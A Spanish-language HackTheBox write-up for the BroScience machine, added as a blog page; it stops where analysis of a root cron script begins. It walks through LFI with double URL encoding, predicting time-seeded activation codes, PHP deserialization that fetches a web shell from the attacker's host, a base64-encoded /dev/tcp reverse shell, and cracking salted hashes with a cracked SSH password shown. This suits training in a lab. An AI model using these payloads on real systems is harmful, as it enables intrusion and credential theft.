@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Broscience Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="
+
+Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes
+
+
+
+  Introducción
+  
+    
+    Link to heading
+  
+
+BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Broscience Machine - HackTheBox">
+  <meta name="twitter:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
+
+<meta property="og:url" content="https://celero0.github.io/posts/broscience/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Broscience Machine - HackTheBox">
+  <meta property="og:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-05T19:58:38+00:00">
+    <meta property="article:modified_time" content="2026-06-05T19:58:38+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/broscience/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/broscience/">
+              Broscience Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-06-05T19:58:38Z">
+                June 5, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por <code>root</code> conduce al compromiso total de la máquina.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo completo de puertos en busca de servicios expuestos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.228.129 -oG allPorts
+</span></span></code></pre></div><p>Obteniendo los siguientes puertos abiertos:</p>
+<img src="/images/Pasted image 20260604174047.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A continuación, realizamos un escaneo de versiones y scripts sobre los puertos identificados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.228.129 -oN portServices
+</span></span></code></pre></div><img src="/images/Pasted image 20260604174155.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Durante la enumeración se identifica el dominio <code>broscience.htb</code>, asociado al servicio web. Por ello, añadimos la entrada correspondiente en nuestro archivo <code>/etc/hosts</code>.</p>
+<img src="/images/Pasted image 20260604174319.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Comenzamos la enumeración del servicio web. Al acceder a la aplicación observamos la siguiente página:</p>
+<img src="/images/Pasted image 20260604174348.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La aplicación dispone de una funcionalidad de inicio de sesión.</p>
+<img src="/images/Pasted image 20260604174641.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Además, permite el registro de nuevos usuarios y ofrece funcionalidades adicionales.</p>
+<img src="/images/Pasted image 20260604174657.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Analizando la estructura de la aplicación mediante <code>Burp Suite</code>, destaca especialmente el directorio <code>includes</code>.</p>
+<img src="/images/Pasted image 20260604174623.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>El servidor web permite el listado de directorios en la ruta <code>/includes/</code>, exponiendo archivos internos como <code>db_connect.php</code>, <code>utils.php</code> y otros. Esta información facilita la enumeración de la aplicación y puede ayudar a identificar vectores de ataque adicionales.</p>
+<img src="/images/Pasted image 20260604175123.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Aunque los archivos PHP no exponen su código fuente debido a que son interpretados por el servidor, el archivo <code>img.php</code> genera mensajes de error que revelan información interna de la aplicación. Entre los datos filtrados se encuentra el parámetro <code>path</code>, utilizado por el script para procesar solicitudes.</p>
+<p>Esta divulgación de información puede resultar útil para identificar vulnerabilidades adicionales.</p>
+<img src="/images/Pasted image 20260604175345.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotando-lfi">
+  Explotando LFI
+  <a class="heading-link" href="#explotando-lfi">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si realizamos la siguiente petición, la aplicación detecta el intento de acceso a archivos arbitrarios mediante un ataque de <code>LFI</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=/etc/passwd&#34;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260604182606.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para evadir esta validación, aplicamos una doble codificación URL (<code>double URL encoding</code>) a la ruta solicitada:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34&#34;</span>
+</span></span></code></pre></div><p>La técnica resulta efectiva, permitiendo la lectura arbitraria de archivos del sistema.</p>
+<img src="/images/Pasted image 20260604182753.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Aprovechando esta vulnerabilidad, descargamos el archivo <code>utils.php</code> para analizar su código fuente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30&#34;</span> -o includes.php
+</span></span></code></pre></div><h1 id="generando-código-de-activación">
+  Generando código de activación
+  <a class="heading-link" href="#generando-c%c3%b3digo-de-activaci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<img src="/images/Pasted image 20260604185237.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Tras revisar el código fuente, se identificó que los códigos de activación son generados mediante la función <code>generate_activation_code()</code>, la cual utiliza <code>rand()</code> para seleccionar 32 caracteres de forma pseudoaleatoria. Además, el generador es inicializado mediante <code>srand(time())</code>, utilizando como semilla la marca temporal actual del servidor.</p>
+<p>Debido a que la semilla depende únicamente del tiempo, es posible reproducir el proceso de generación si se conoce o se puede estimar el instante exacto en el que fue creado el código. Para validar esta hipótesis, se desarrolló un script en PHP que replica la lógica de la aplicación, utilizando como semilla el valor de la cabecera HTTP <code>Date</code> devuelta por el servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>php <span style="color:#ff7b72;font-weight:bold">-</span>r <span style="color:#a5d6ff">&#39;function generate_activation_code() {              
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    $chars = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    $activation_code = &#34;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    for ($i = 0; $i &lt; 32; $i++) {
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    return $activation_code;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">}
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">$timestamp = strtotime(&#34;Thu, 04 Jun 2026 23:10:14 GMT&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">echo &#34;Timestamp: $timestamp\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">srand($timestamp);
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">echo &#34;Código: &#34; . generate_activation_code() . &#34;\n&#34;;&#39;</span>
+</span></span></code></pre></div><p>Con esta información, registramos una nueva cuenta para estimar el instante exacto de generación del código de activación.</p>
+<p>Enviamos la siguiente petición:</p>
+<img src="/images/Pasted image 20260604191651.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La respuesta del servidor indica que la cuenta ha sido creada correctamente e incluye la cabecera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Date: Thu, 04 Jun 2026 23:16:32 GMT
+</span></span></code></pre></div><img src="/images/Pasted image 20260604191732.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Utilizando esta marca temporal como semilla, reproducimos localmente el algoritmo y obtenemos el siguiente código de activación para la cuenta recién creada:</p>
+<img src="/images/Pasted image 20260604191844.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Finalmente, enviamos el código generado al endpoint de activación:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://broscience.htb/activate.php?code<span style="color:#ff7b72;font-weight:bold">=</span>9R9DnjtpJLFdJ8QabMK4K2eRJ01eBvXD
+</span></span></code></pre></div><p>La activación se completa correctamente.</p>
+<img src="/images/Pasted image 20260604192014.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotación-de-deserialización-insegura">
+  Explotación de Deserialización Insegura
+  <a class="heading-link" href="#explotaci%c3%b3n-de-deserializaci%c3%b3n-insegura">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Tras iniciar sesión, la aplicación establece dos cookies. La más interesante es <code>user-prefs</code>.</p>
+<img src="/images/Pasted image 20260604203013.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si recordamos el código presente en <code>utils.php</code>, la función <code>get_theme()</code> deserializa el contenido de la cookie <code>user-prefs</code> mediante <code>unserialize()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$up</span> <span style="color:#ff7b72;font-weight:bold">=</span> unserialize(base64_decode(<span style="color:#79c0ff">$up_cookie</span>));
+</span></span></code></pre></div><p>Dado que el valor de esta cookie es completamente controlado por el usuario, un atacante puede suministrar objetos PHP arbitrarios durante el proceso de deserialización, dando lugar a una vulnerabilidad de <strong>PHP Object Injection</strong>.</p>
+<p>Además, el archivo define la clase <code>AvatarInterface</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">class</span> <span style="color:#f0883e;font-weight:bold">AvatarInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">public</span> <span style="color:#79c0ff">$tmp</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">public</span> <span style="color:#79c0ff">$imgPath</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">__wakeup</span>() {        
+</span></span><span style="display:flex;"><span>	    <span style="color:#79c0ff">$a</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Avatar(<span style="color:#79c0ff">$this</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>imgPath);
+</span></span><span style="display:flex;"><span>        <span style="color:#79c0ff">$a</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>save(<span style="color:#79c0ff">$this</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>tmp);    
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Cuando un objeto de esta clase es deserializado, PHP ejecuta automáticamente el método mágico <code>__wakeup()</code>, el cual invoca la función <code>save()</code> de la clase <code>Avatar</code>. Debido a que ambas propiedades pueden ser controladas por el atacante, es posible influir directamente en el comportamiento de dicho método.</p>
+<p>Esto convierte a <code>AvatarInterface</code> en un gadget válido dentro de una cadena de explotación de deserialización insegura.</p>
+<p>Para explotar la vulnerabilidad, creamos una instancia de la clase <code>AvatarInterface</code> y configuramos manualmente sus propiedades:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> AvatarInterface();
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>tmp <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.10.14.146:8000/shell.php&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>imgPath <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/var/www/html/shell.php&#34;</span>;
+</span></span></code></pre></div><p>Posteriormente, serializamos el objeto y codificamos el resultado en Base64 para obtener un valor apto para ser enviado en la cookie <code>user-prefs</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">echo</span> base64_encode(serialize(<span style="color:#79c0ff">$obj</span>));
+</span></span></code></pre></div><p>Cuando la aplicación procesa la cookie y ejecuta <code>unserialize()</code>, PHP reconstruye el objeto <code>AvatarInterface</code> y ejecuta automáticamente su método mágico <code>__wakeup()</code>. Como consecuencia, se invoca la función <code>save()</code> utilizando valores completamente controlados por el atacante, desencadenando la acción definida por la cadena de deserialización.</p>
+<p>El script completo y su resultado se muestran a continuación:</p>
+<img src="/images/Pasted image 20260604203550.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A continuación, alojamos una web shell en nuestro equipo atacante con el nombre <code>shell.php</code>:</p>
+<img src="/images/Pasted image 20260604203626.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Posteriormente, iniciamos un servidor HTTP para que el sistema objetivo pueda descargar el archivo remoto.</p>
+<img src="/images/Pasted image 20260604203803.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Después, sustituimos el valor de la cookie <code>user-prefs</code> por la cadena serializada maliciosa:</p>
+<img src="/images/Pasted image 20260604203706.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Tras recargar la página, el servidor realiza una petición hacia nuestro equipo atacante.</p>
+<img src="/images/Pasted image 20260604203825.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Finalmente, accedemos al archivo generado en el servidor web:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=ls&#34;</span>
+</span></span></code></pre></div><p>Confirmando la obtención de ejecución remota de comandos (RCE):</p>
+<img src="/images/Pasted image 20260604203918.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para obtener una shell interactiva, nos ponemos en escucha con <code>penelope</code> en el puerto <code>4455</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>penelope -p <span style="color:#a5d6ff">4455</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20260604204913.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A continuación, ejecutamos el siguiente comando a través de la web shell para obtener una reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ2LzQ0NTUgMD4mMSkgJg==|base64+-d|bash&#34;</span>
+</span></span></code></pre></div><p>Como resultado, obtenemos una shell interactiva como el usuario <code>www-data</code>.</p>
+<img src="/images/Pasted image 20260604205005.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Al revisar el archivo <code>/var/www/html/includes/db_connect.php</code>, encontramos información sensible, incluyendo credenciales de acceso a la base de datos y el valor de la <code>salt</code> utilizada por la aplicación.</p>
+<img src="/images/Pasted image 20260604210730.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Con esta información podemos conectarnos a la base de datos PostgreSQL mediante las credenciales recuperadas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>psql -h localhost -p <span style="color:#a5d6ff">5432</span> --username<span style="color:#ff7b72;font-weight:bold">=</span>dbuser -W broscience
+</span></span></code></pre></div><img src="/images/Pasted image 20260604211228.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Una vez dentro de la base de datos, podemos listar las tablas existentes utilizando el siguiente comando:</p>
+<pre tabindex="0"><code class="language-psql" data-lang="psql">\dt
+</code></pre><img src="/images/Pasted image 20260604211528.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Entre las tablas identificadas destaca <code>users</code>, por lo que procedemos a examinar su estructura:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">\d</span> users
+</span></span></code></pre></div><p>Observamos que contiene, entre otras, las columnas <code>username</code> y <code>password</code>.</p>
+<img src="/images/Pasted image 20260604211545.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para recuperar los datos almacenados en dichas columnas ejecutamos la siguiente consulta:</p>
+<pre tabindex="0"><code class="language-psql" data-lang="psql">select username,password from users;
+</code></pre><img src="/images/Pasted image 20260604211651.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>La consulta devuelve los hashes de las contraseñas de los usuarios registrados. Exportamos esta información a nuestra máquina local para intentar descifrarlos, teniendo en cuenta que la aplicación utiliza la <code>salt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NaCl
+</span></span></code></pre></div><p>Para que <code>John</code> interprete correctamente el formato utilizado por la aplicación, almacenamos los hashes con la siguiente estructura:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>usuario:$dynamic_4$hash_en_md5$salt
+</span></span></code></pre></div><p>El archivo final queda de la siguiente manera:</p>
+<img src="/images/Pasted image 20260604212334.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>A continuación, ejecutamos <code>John the Ripper</code> utilizando el formato adecuado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>dynamic_4 --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+</span></span></code></pre></div><p>Obteniendo las contraseñas de tres usuarios:</p>
+<img src="/images/Pasted image 20260604212412.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al enumerar los usuarios existentes en el sistema observamos que existe la cuenta <code>bill</code>.</p>
+<img src="/images/Pasted image 20260604212455.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probamos las credenciales recuperadas mediante <code>SSH</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>bill : iluvhorsesandgym
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh bill@broscience.htb
+</span></span></code></pre></div><p>La autenticación es exitosa y obtenemos acceso al sistema como el usuario <code>bill</code>.</p>
+<img src="/images/Pasted image 20260604212621.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Con acceso a la cuenta de <code>bill</code>, ya es posible recuperar la flag de usuario:</p>
+<img src="/images/Pasted image 20260604213706.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Utilizamos <code>pspy</code> para monitorizar los procesos ejecutados en la máquina objetivo.</p>
+<p>Tras observar el sistema durante algunos minutos, identificamos un proceso que se ejecuta periódicamente:</p>
+<img src="/images/Pasted image 20260605150409.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>El comando ejecutado es el siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
+</span></span></code></pre></div><p>Analizando el contenido de <code>renew_cert.sh</code>, encontramos el siguiente código:</p>
